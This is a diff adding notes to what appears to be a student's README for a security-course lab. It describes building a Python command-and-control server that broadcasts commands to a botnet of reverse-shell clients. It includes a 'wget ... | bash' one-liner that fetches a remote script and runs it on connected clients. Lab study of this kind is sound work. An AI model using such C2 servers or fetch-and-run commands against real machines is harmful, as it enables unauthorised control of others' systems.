@@ -9,3 +9,16 @@ We then were taught how to use nmap to scan for open ports. We learned about som
 We also have to create a TCP server that does 2 main things and functions as our command and control server: shellServer.py
 1. accept connection from client
 2. send and receive commands
+The problem with this TCP server is that it can only handle one connection. If our goal is to create a network of victim clients (botnet) then we need to have a TCP server that can handle multiple connections.
+
+We create another TCP server that can handle multiple connections and the idea is that instead of sending and receiving individual commands to each bot, we want the bot to all receive the same command. After our command and control server receives a response, we want it to print the bot's IP address and the result of executing the command. What I have so far is in shellServerMulti.py.  The exercise is considered completed when this server reads from a file and sends the commands in that file to the clients. I know there are probably a lot of ways this can be done, but what i've done is have the filepath passed in as an argument when you start the server for example:  
+```
+kali@kali:~$ **python3 shellServerMulti.py <filepath>**
+```
+For some reason this is not working. I also am thinking that we can just execute this command once we have the client connect since we are using a reverse shell anyway:  
+```
+kali@kali~$ **wget -O - <IP ADDRESS>:PORT/filepath/file.sh | bash**
+```
+This could encapsulate the commands outside of the server code (this idea came to me this morning as I was putting together this github) and I wouldn't have to worry about parsing the file in python at all. The code would be super clean.  
+
+Thank you for anyone taking the time to look over this stuff and offer advice, pointers, or contributions. Feel free to use and abuse all of this code.
